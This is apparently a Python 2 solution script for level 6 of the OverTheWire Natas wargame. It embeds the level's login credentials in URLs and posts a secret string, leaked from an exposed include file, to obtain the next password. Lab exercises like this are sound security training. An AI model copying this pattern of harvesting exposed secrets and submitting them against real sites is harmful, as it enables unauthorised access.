import requests,json

target = 'http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/index.php'
target1 = 'http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/includes/secret.inc'
payload = {'secret':'FOEIUWGHFEEUHOFUOIU','submit':'Submit'}

r = requests.post(url=target, data=payload)
if r.status_code != requests.codes.ok :
	print 'Unable to Connect'
else :
	print 'Connected'

print r.text